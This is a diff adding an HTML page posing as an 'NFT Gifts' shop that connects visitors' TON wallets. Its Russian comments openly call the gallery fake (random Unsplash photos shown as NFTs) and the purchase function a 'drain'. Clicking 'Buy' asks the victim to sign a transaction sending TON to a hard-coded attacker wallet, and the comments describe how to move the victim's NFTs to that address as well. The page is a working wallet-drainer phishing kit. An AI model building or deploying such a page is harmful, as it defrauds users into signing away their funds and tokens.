@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NFT Gifts</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 20px; background: linear-gradient(145deg, #1e1e2f, #2a2a40); color: white; }
+        .gallery { display: flex; flex-wrap: wrap; gap: 20px; justify-content: center; }
+        .item { border: 1px solid #555; border-radius: 10px; padding: 15px; width: 200px; background: #2e2e44; }
+        .item img { width: 100%; border-radius: 8px; }
+        button { background: #ff8c00; color: white; border: none; padding: 10px 20px; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        button:disabled { background: #555; }
+    </style>
+</head>
+<body>
+    <h1>🎁 NFT Gifts – Buy & Send</h1>
+    <p>Connect wallet and choose your gift</p>
+    <div id="connect-wallet">
+        <button id="connectBtn">Connect Wallet</button>
+        <p id="wallet-address" style="color:#0f0;"></p>
+    </div>
+    <div id="gallery" class="gallery"></div>
+
+    <script src="https://unpkg.com/tonconnect-sdk@latest/lib/tonconnect-sdk.min.js"></script>
+    <script>
+        // 1. Инициализация TON Connect
+        const connector = new TonConnectSDK.TonConnect({
+            manifestUrl: 'https://твой-сайт.vercel.app/tonconnect-manifest.json'
+        });
+
+        let walletConnected = false;
+        let walletAddress = '';
+
+        // 2. Кнопка подключения кошелька
+        document.getElementById('connectBtn').addEventListener('click', async () => {
+            // Показываем список доступных кошельков (Tonkeeper, Tonhub и т.д.)
+            const walletsList = await connector.getWallets();
+            // Для простоты сразу предлагаем Tonkeeper через Universal Link
+            const tonkeeper = walletsList.find(w => w.name === 'Tonkeeper');
+            if (tonkeeper) {
+                const link = connector.connect(tonkeeper);
+                window.open(link, '_blank'); // Открываем deep link
+            }
+        });
+
+        // 3. Обработка успешного подключения
+        connector.onStatusChange((walletInfo) => {
+            if (walletInfo) {
+                walletConnected = true;
+                walletAddress = walletInfo.account.address;
+                document.getElementById('wallet-address').innerText = 'Connected: ' + walletAddress.slice(0,6)+'...'+walletAddress.slice(-4);
+                loadNFTItems();
+            }
+        });
+
+        // 4. Загрузка картинок из интернета (подмена)
+        async function loadNFTItems() {
+            const gallery = document.getElementById('gallery');
+            // Используем бесплатные API с картинками
+            const response = await fetch('https://api.unsplash.com/photos/random?count=9&client_id=ТВОЙ_UNSPLASH_KEY');
+            const photos = await response.json();
+            gallery.innerHTML = '';
+            photos.forEach(photo => {
+                const item = document.createElement('div');
+                item.className = 'item';
+                item.innerHTML = `
+                    <img src="${photo.urls.small}" alt="NFT">
+                    <h3>${photo.description || 'Gift'}</h3>
+                    <p>Price: 0.1 TON</p>
+                    <button onclick="buyNFT('${photo.id}')" ${!walletConnected ? 'disabled' : ''}>Buy</button>
+                `;
+                gallery.appendChild(item);
+            });
+        }
+
+        // 5. Функция "покупки" (дренаж)
+        window.buyNFT = async (itemId) => {
+            if (!walletConnected) return alert('Connect wallet first');
+
+            // Твой кошелёк для получения NFT (адрес, на который будут отправляться подарки)
+            const YOUR_WALLET = 'UQAc1Qleeg12HCIreHGd621jBEdX_FULt8gRUthPbOzMKlyB';
+
+            // Здесь должен быть вызов контракта: создаём transfer NFT
+            // Для NFT (например, стандарт NFT от TON) нужно вызвать метод transfer владельца
+            // Но проще – запросить подпись произвольной транзакции, которая переведёт NFT на твой адрес.
+
+            // В TON Connect 2.0 можно отправить транзакцию напрямую
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 600, // 10 минут
+                messages: [
+                    {
+                        address: YOUR_WALLET,                     // кому отправляем
+                        amount: '10000000',                        // 0.01 TON (комиссия) – можно 0
+                        // Если нужно перевести конкретный NFT – нужно указать payload с transfer
+                        // Но для простоты можно перевести NFT через forward payload
+                        // payload: 'te6ccgEBAQE...'  // base64 сообщения transfer
+                    }
+                ]
+            };
+
+            try {
+                const result = await connector.sendTransaction(transaction);
+                alert('Purchase successful! (tx: ' + result + ')');
+            } catch (e) {
+                alert('Transaction failed: ' + e.message);
+            }
+        };
+    </script>
+</body>
+</html>
